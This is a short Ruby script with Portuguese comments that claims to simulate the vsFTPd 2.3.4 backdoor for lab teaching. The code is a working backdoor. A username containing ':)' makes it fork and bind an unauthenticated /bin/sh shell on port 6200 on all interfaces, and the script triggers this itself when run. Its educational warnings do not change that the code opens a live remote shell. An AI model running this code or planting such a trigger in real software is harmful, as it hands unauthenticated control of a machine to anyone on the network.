# simulate_backdoor.rb
# Autor: llRods

########################################################
# Aviso! Este script foi feito para fins educacionais. #
# Execute apenas em ambientes isolados e controlados.  #
# Não exponha bind shell à rede pública.               #
########################################################

# Ambiente: VirtualBox (Host-Only), Kali Linux.
# Escopo: somente máquinas próprias/VMs para fins educativos.
# Objetivo: Simular o backdoor inserido no serviço vsFTPd 2.3.4,
# criando um shell remoto na porta 6200 ao acessar o FTP com usuário ":)"

require 'socket'

def handle_login(username)
    puts "[FTP] Recebido USER #{username}"

    if username.include?(':)')
        puts '[BACKDOOR] Trigger detectado! Criando bind shell na porta 6200...'

        pid = fork do
            server = TCPServer.new('0.0.0.0', 6200)
            puts '[BACKDOOR] Escutando na porta 6200...'

            client = server.accept
            puts '[BACKDOOR] Conexão recebida! Iniciando /bin/sh'

            $stdin.reopen(client)
            $stdout.reopen(client)
            $stderr.reopen(client)

            exec('/bin/sh')
        end

        Process.detach(pid)
    else
        puts '[FTP] Usuário normal, prosseguindo login...'
    end
end

handle_login('llrods')
handle_login('teste:)')
